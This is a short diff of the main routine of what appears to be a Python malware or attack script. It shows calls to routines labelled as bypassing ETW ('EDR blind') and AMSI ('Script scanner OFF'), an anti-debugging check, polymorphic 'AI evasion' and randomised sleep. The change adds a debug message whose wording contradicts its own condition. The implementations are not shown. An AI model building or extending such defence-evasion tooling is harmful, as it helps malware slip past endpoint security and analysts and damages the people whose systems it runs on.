@@ -342,6 +342,7 @@ if __name__ == "__main__":
     etw_ghost_bypass()          # EDR blind
     amsi_bypass()              # Script scanner OFF
     if not anti_debug_suite():  # DEBUGGER CHECK ← NEW!
+         print("\033[31m[!] DEBUGGER NOT DETECTED - EXITING\033[0m")
         # sys.exit(0) #aktifkan jika tidak sedang pengujian
     polymorphic_init()         # AI evasion
     time.sleep(random.randint(15, 45))
